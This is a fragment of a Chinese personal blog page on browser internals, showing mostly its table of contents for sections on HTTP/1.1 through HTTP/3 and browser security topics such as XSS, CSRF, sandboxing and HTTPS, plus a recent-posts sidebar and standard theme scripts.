href="#%E7%BC%9D%E7%BC%9D%E8%A1%A5%E8%A1%A5%E7%9A%84-HTTP-1-1"><span class="toc-number">6.1.3.</span> <span class="toc-text">缝缝补补的 HTTP&#x2F;1.1</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E6%94%B9%E8%BF%9B%E6%8C%81%E4%B9%85%E8%BF%9E%E6%8E%A5"><span class="toc-number">6.1.3.1.</span> <span class="toc-text">1. 改进持久连接</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E4%B8%8D%E6%88%90%E7%86%9F%E7%9A%84-HTTP-%E7%AE%A1%E7%BA%BF%E5%8C%96"><span class="toc-number">6.1.3.2.</span> <span class="toc-text">2. 不成熟的 HTTP 管线化</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E6%8F%90%E4%BE%9B%E8%99%9A%E6%8B%9F%E4%B8%BB%E6%9C%BA%E7%9A%84%E6%94%AF%E6%8C%81"><span class="toc-number">6.1.3.3.</span> <span class="toc-text">3. 提供虚拟主机的支持</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E5%AF%B9%E5%8A%A8%E6%80%81%E7%94%9F%E6%88%90%E7%9A%84%E5%86%85%E5%AE%B9%E6%8F%90%E4%BE%9B%E4%BA%86%E5%AE%8C%E7%BE%8E%E6%94%AF%E6%8C%81"><span class="toc-number">6.1.3.4.</span> <span class="toc-text">4. 对动态生成的内容提供了完美支持</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-%E5%AE%A2%E6%88%B7%E7%AB%AF-Cookie%E3%80%81%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6"><span class="toc-number">6.1.3.5.</span> <span class="toc-text">5. 客户端 Cookie、安全机制</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HTTP-2%EF%BC%9A%E5%A6%82%E4%BD%95%E6%8F%90%E5%8D%87%E7%BD%91%E7%BB%9C%E9%80%9F%E5%BA%A6%EF%BC%9F"><span class="toc-number">6.2.</span> <span class="toc-text">HTTP&#x2F;2：如何提升网络速度？</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#HTTP-1-1-%E7%9A%84%E4%B8%BB%E8%A6%81%E9%97%AE%E9%A2%98"><span class="toc-number">6.2.1.</span> <span class="toc-text">HTTP&#x2F;1.1 的主要问题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HTTP-2-%E7%9A%84%E5%A4%9A%E8%B7%AF%E5%A4%8D%E7%94%A8"><span class="toc-number">6.2.2.</span> <span class="toc-text">HTTP&#x2F;2 的多路复用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%9A%E8%B7%AF%E5%A4%8D%E7%94%A8%E7%9A%84%E5%AE%9E%E7%8E%B0"><span class="toc-number">6.2.3.</span> <span class="toc-text">多路复用的实现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HTTP-2-%E5%85%B6%E4%BB%96%E7%89%B9%E6%80%A7"><span class="toc-number">6.2.4.</span> <span class="toc-text">HTTP&#x2F;2 其他特性</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E5%8F%AF%E4%BB%A5%E8%AE%BE%E7%BD%AE%E8%AF%B7%E6%B1%82%E7%9A%84%E4%BC%98%E5%85%88%E7%BA%A7"><span class="toc-number">6.2.4.1.</span> <span class="toc-text">1. 可以设置请求的优先级</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%8E%A8%E9%80%81"><span class="toc-number">6.2.4.2.</span> <span class="toc-text">2. 服务器推送</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E5%A4%B4%E9%83%A8%E5%8E%8B%E7%BC%A9"><span class="toc-number">6.2.4.3.</span> <span class="toc-text">3. 头部压缩</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HTTP-3%EF%BC%9A%E7%94%A9%E6%8E%89TCP%E3%80%81TLS-%E7%9A%84%E5%8C%85%E8%A2%B1%EF%BC%8C%E6%9E%84%E5%BB%BA%E9%AB%98%E6%95%88%E7%BD%91%E7%BB%9C"><span class="toc-number">6.3.</span> <span class="toc-text">HTTP&#x2F;3：甩掉TCP、TLS 的包袱，构建高效网络</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#HTTP-2-%E7%BC%BA%E9%99%B7%E2%80%94%E2%80%94TCP-%E7%9A%84%E9%98%9F%E5%A4%B4%E9%98%BB%E5%A1%9E"><span class="toc-number">6.3.1.</span> <span class="toc-text">HTTP&#x2F;2 缺陷——TCP 的队头阻塞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TCP-%E5%BB%BA%E7%AB%8B%E8%BF%9E%E6%8E%A5%E7%9A%84%E5%BB%B6%E6%97%B6"><span class="toc-number">6.3.2.</span> <span class="toc-text">TCP 建立连接的延时</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TCP-%E5%8D%8F%E8%AE%AE%E5%83%B5%E5%8C%96"><span class="toc-number">6.3.3.</span> <span class="toc-text">TCP 协议僵化</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#QUIC-%E5%8D%8F%E8%AE%AE"><span class="toc-number">6.3.4.</span> <span class="toc-text">QUIC 协议</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HTTP-3-%E7%9A%84%E6%8C%91%E6%88%98"><span class="toc-number">6.3.5.</span> <span class="toc-text">HTTP&#x2F;3 的挑战</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AE%89%E5%85%A8"><span class="toc-number">7.</span> <span class="toc-text">浏览器安全</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5%EF%BC%9A%E4%B8%BA%E4%BB%80%E4%B9%88XMLHttpRequest%E4%B8%8D%E8%83%BD%E8%B7%A8%E5%9F%9F%E8%AF%B7%E6%B1%82%E8%B5%84%E6%BA%90%EF%BC%9F"><span class="toc-number">7.1.</span> <span class="toc-text">同源策略：为什么XMLHttpRequest不能跨域请求资源？</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5"><span class="toc-number">7.1.1.</span> <span class="toc-text">什么是同源策略</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%E5%92%8C%E4%BE%BF%E5%88%A9%E6%80%A7%E7%9A%84%E6%9D%83%E8%A1%A1"><span class="toc-number">7.1.2.</span> <span class="toc-text">安全和便利性的权衡</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E9%A1%B5%E9%9D%A2%E4%B8%AD%E5%8F%AF%E4%BB%A5%E5%B5%8C%E5%85%A5%E7%AC%AC%E4%B8%89%E6%96%B9%E8%B5%84%E6%BA%90"><span class="toc-number">7.1.2.1.</span> <span class="toc-text">1. 页面中可以嵌入第三方资源</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E8%B7%A8%E5%9F%9F%E8%B5%84%E6%BA%90%E5%85%B1%E4%BA%AB%E5%92%8C%E8%B7%A8%E6%96%87%E6%A1%A3%E6%B6%88%E6%81%AF%E6%9C%BA%E5%88%B6"><span class="toc-number">7.1.2.2.</span> <span class="toc-text">2. 跨域资源共享和跨文档消息机制</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB%EF%BC%88XSS%EF%BC%89%EF%BC%9A%E4%B8%BA%E4%BB%80%E4%B9%88Cookie%E4%B8%AD%E6%9C%89HttpOnly%E5%B1%9E%E6%80%A7%EF%BC%9F"><span class="toc-number">7.2.</span> <span class="toc-text">跨站脚本攻击（XSS）：为什么Cookie中有HttpOnly属性？</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF-XSS-%E6%94%BB%E5%87%BB"><span class="toc-number">7.2.1.</span> <span class="toc-text">什么是 XSS 攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%81%B6%E6%84%8F%E8%84%9A%E6%9C%AC%E6%98%AF%E6%80%8E%E4%B9%88%E6%B3%A8%E5%85%A5%E7%9A%84"><span class="toc-number">7.2.2.</span> <span class="toc-text">恶意脚本是怎么注入的</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E5%AD%98%E5%82%A8%E5%9E%8B-XSS-%E6%94%BB%E5%87%BB"><span class="toc-number">7.2.2.1.</span> <span class="toc-text">1. 存储型 XSS 攻击</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E5%8F%8D%E5%B0%84%E5%9E%8B-XSS-%E6%94%BB%E5%87%BB"><span class="toc-number">7.2.2.2.</span> <span class="toc-text">2. 反射型 XSS 攻击</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E5%9F%BA%E4%BA%8E-DOM-%E7%9A%84-XSS-%E6%94%BB%E5%87%BB"><span class="toc-number">7.2.2.3.</span> <span class="toc-text">3. 基于 DOM 的 XSS 攻击</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E9%98%BB%E6%AD%A2-XSS-%E6%94%BB%E5%87%BB"><span class="toc-number">7.2.3.</span> <span class="toc-text">如何阻止 XSS 攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AF%B9%E8%BE%93%E5%85%A5%E8%84%9A%E6%9C%AC%E8%BF%9B%E8%A1%8C%E8%BF%87%E6%BB%A4%E6%88%96%E8%BD%AC%E7%A0%81"><span class="toc-number">7.2.3.1.</span> <span class="toc-text">1. 服务器对输入脚本进行过滤或转码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E5%85%85%E5%88%86%E5%88%A9%E7%94%A8-CSP"><span class="toc-number">7.2.3.2.</span> <span class="toc-text">2. 充分利用 CSP</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E4%BD%BF%E7%94%A8-HttpOnly-%E5%B1%9E%E6%80%A7"><span class="toc-number">7.2.3.3.</span> <span class="toc-text">3. 使用 HttpOnly 属性</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CSRF%E6%94%BB%E5%87%BB%EF%BC%9A%E9%99%8C%E7%94%9F%E9%93%BE%E6%8E%A5%E4%B8%8D%E8%A6%81%E9%9A%8F%E4%BE%BF%E7%82%B9"><span class="toc-number">7.3.</span> <span class="toc-text">CSRF攻击：陌生链接不要随便点</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF-CSRF-%E6%94%BB%E5%87%BB"><span class="toc-number">7.3.1.</span> <span class="toc-text">什么是 CSRF 攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E8%87%AA%E5%8A%A8%E5%8F%91%E8%B5%B7-Get-%E8%AF%B7%E6%B1%82"><span class="toc-number">7.3.1.1.</span> <span class="toc-text">1. 自动发起 Get 请求</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E8%87%AA%E5%8A%A8%E5%8F%91%E8%B5%B7-POST-%E8%AF%B7%E6%B1%82"><span class="toc-number">7.3.1.2.</span> <span class="toc-text">2. 自动发起 POST 请求</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E5%BC%95%E8%AF%B1%E7%94%A8%E6%88%B7%E7%82%B9%E5%87%BB%E9%93%BE%E6%8E%A5"><span class="toc-number">7.3.1.3.</span> <span class="toc-text">3. 引诱用户点击链接</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E9%98%B2%E6%AD%A2-CSRF-%E6%94%BB%E5%87%BB"><span class="toc-number">7.3.2.</span> <span class="toc-text">如何防止 CSRF 攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E5%85%85%E5%88%86%E5%88%A9%E7%94%A8%E5%A5%BD-Cookie-%E7%9A%84-SameSite-%E5%B1%9E%E6%80%A7"><span class="toc-number">7.3.2.1.</span> <span class="toc-text">1. 充分利用好 Cookie 的 SameSite 属性</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E9%AA%8C%E8%AF%81%E8%AF%B7%E6%B1%82%E7%9A%84%E6%9D%A5%E6%BA%90%E7%AB%99%E7%82%B9"><span class="toc-number">7.3.2.2.</span> <span class="toc-text">2. 验证请求的来源站点</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-CSRF-Token"><span class="toc-number">7.3.2.3.</span> <span class="toc-text">3. CSRF Token</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%E6%B2%99%E7%AE%B1%EF%BC%9A%E9%A1%B5%E9%9D%A2%E5%92%8C%E7%B3%BB%E7%BB%9F%E4%B9%8B%E9%97%B4%E7%9A%84%E9%9A%94%E7%A6%BB%E5%A2%99"><span class="toc-number">7.4.</span> <span class="toc-text">安全沙箱：页面和系统之间的隔离墙</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84%E5%A4%9A%E8%BF%9B%E7%A8%8B%E6%9E%B6%E6%9E%84"><span class="toc-number">7.4.1.</span> <span class="toc-text">安全视角下的多进程架构</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%E6%B2%99%E7%AE%B1"><span class="toc-number">7.4.2.</span> <span class="toc-text">安全沙箱</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%E6%B2%99%E7%AE%B1%E5%A6%82%E4%BD%95%E5%BD%B1%E5%93%8D%E5%90%84%E4%B8%AA%E6%A8%A1%E5%9D%97%E5%8A%9F%E8%83%BD"><span class="toc-number">7.4.3.</span> <span class="toc-text">安全沙箱如何影响各个模块功能</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E6%8C%81%E4%B9%85%E5%AD%98%E5%82%A8"><span class="toc-number">7.4.3.1.</span> <span class="toc-text">1. 持久存储</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E7%BD%91%E7%BB%9C%E8%AE%BF%E9%97%AE"><span class="toc-number">7.4.3.2.</span> <span class="toc-text">2. 网络访问</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E7%94%A8%E6%88%B7%E4%BA%A4%E4%BA%92"><span class="toc-number">7.4.3.3.</span> <span class="toc-text">3. 用户交互</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HTTPS%EF%BC%9A%E8%AE%A9%E6%95%B0%E6%8D%AE%E4%BC%A0%E8%BE%93%E6%9B%B4%E5%AE%89%E5%85%A8"><span class="toc-number">7.5.</span> <span class="toc-text">HTTPS：让数据传输更安全</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9C%A8-HTTP-%E5%8D%8F%E8%AE%AE%E6%A0%88%E4%B8%AD%E5%BC%95%E5%85%A5%E5%AE%89%E5%85%A8%E5%B1%82"><span class="toc-number">7.5.1.</span> <span class="toc-text">在 HTTP 协议栈中引入安全层</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E7%89%88%EF%BC%9A%E4%BD%BF%E7%94%A8%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86"><span class="toc-number">7.5.1.1.</span> <span class="toc-text">第一版：使用对称加密</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E7%89%88%EF%BC%9A%E4%BD%BF%E7%94%A8%E9%9D%9E%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86"><span class="toc-number">7.5.1.2.</span> <span class="toc-text">第二版：使用非对称加密</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E7%89%88%EF%BC%9A%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86%E5%92%8C%E9%9D%9E%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86%E6%90%AD%E9%85%8D%E4%BD%BF%E7%94%A8"><span class="toc-number">7.5.1.3.</span> <span class="toc-text">第三版：对称加密和非对称加密搭配使用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E5%9B%9B%E7%89%88%EF%BC%9A%E6%B7%BB%E5%8A%A0%E6%95%B0%E5%AD%97%E8%AF%81%E4%B9%A6"><span class="toc-number">7.5.1.4.</span> <span class="toc-text">第四版：添加数字证书</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E5%AD%97%E8%AF%81%E4%B9%A6%E7%9A%84%E7%94%B3%E8%AF%B7%E5%92%8C%E9%AA%8C%E8%AF%81"><span class="toc-number">7.5.2.</span> <span class="toc-text">数字证书的申请和验证</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2021/10/13/%E3%80%90%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87%E3%80%91%E2%80%94%20%E2%80%94%20%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/" title="【面试准备】— — 计算机网络"><img src="https://i.loli.net/2021/10/13/TzfF5RQVrDNdm76.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="【面试准备】— — 计算机网络"/></a><div class="content"><a class="title" href="/2021/10/13/%E3%80%90%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87%E3%80%91%E2%80%94%20%E2%80%94%20%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/" title="【面试准备】— — 计算机网络">【面试准备】— — 计算机网络</a><time datetime="2021-10-13T14:28:02.000Z" title="发表于 2021-10-13 22:28:02">2021-10-13</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/10/11/%E3%80%90%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87%E3%80%91%E2%80%94%20%E2%80%94%20%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98/" title="【面试准备】— — 常见问题"><img src="https://i.loli.net/2021/10/13/TzfF5RQVrDNdm76.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="【面试准备】— — 常见问题"/></a><div class="content"><a class="title" href="/2021/10/11/%E3%80%90%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87%E3%80%91%E2%80%94%20%E2%80%94%20%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98/" title="【面试准备】— — 常见问题">【面试准备】— — 常见问题</a><time datetime="2021-10-11T14:03:14.000Z" title="发表于 2021-10-11 22:03:14">2021-10-11</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/10/11/%E3%80%90%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87%E3%80%91%E2%80%94%20%E2%80%94%20%E5%89%8D%E7%AB%AF%E7%BB%BC%E5%90%88%E7%AF%87/" title="【面试准备】— — 前端综合篇"><img src="https://i.loli.net/2021/10/13/TzfF5RQVrDNdm76.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="【面试准备】— — 前端综合篇"/></a><div class="content"><a class="title" href="/2021/10/11/%E3%80%90%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87%E3%80%91%E2%80%94%20%E2%80%94%20%E5%89%8D%E7%AB%AF%E7%BB%BC%E5%90%88%E7%AF%87/" title="【面试准备】— — 前端综合篇">【面试准备】— — 前端综合篇</a><time datetime="2021-10-11T12:53:49.000Z" title="发表于 2021-10-11 20:53:49">2021-10-11</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/10/06/%E3%80%90%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0%E3%80%91%E2%80%94%20%E2%80%94%20%E9%87%8D%E5%AD%A6%E5%89%8D%E7%AB%AF%EF%BC%88%E6%9E%81%E5%AE%A2%E6%97%B6%E9%97%B4%EF%BC%89/" title="【阅读笔记】— — 重学前端（极客时间）"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="【阅读笔记】— — 重学前端（极客时间）"/></a><div class="content"><a class="title" href="/2021/10/06/%E3%80%90%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0%E3%80%91%E2%80%94%20%E2%80%94%20%E9%87%8D%E5%AD%A6%E5%89%8D%E7%AB%AF%EF%BC%88%E6%9E%81%E5%AE%A2%E6%97%B6%E9%97%B4%EF%BC%89/" title="【阅读笔记】— — 重学前端（极客时间）">【阅读笔记】— — 重学前端（极客时间）</a><time datetime="2021-10-06T20:49:27.000Z" title="发表于 2021-10-07 04:49:27">2021-10-07</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/09/29/%E3%80%90%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86%E3%80%91%E2%80%94%20%E2%80%94%20git%20%E6%93%8D%E4%BD%9C/" title="【知识整理】— — git 操作"><img src="https://i.loli.net/2021/10/13/K1ZJbqocNyQfnws.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="【知识整理】— — git 操作"/></a><div class="content"><a class="title" href="/2021/09/29/%E3%80%90%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86%E3%80%91%E2%80%94%20%E2%80%94%20git%20%E6%93%8D%E4%BD%9C/" title="【知识整理】— — git 操作">【知识整理】— — git 操作</a><time datetime="2021-09-29T15:12:34.000Z" title="发表于 2021-09-29 23:12:34">2021-09-29</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By 青山</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/click-heart.min.js" async="async" mobile="false"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/haruto.model.json"},"display":{"position":"left","width":150,"height":300},"mobile":{"show":true},"log":false});</script></body></html>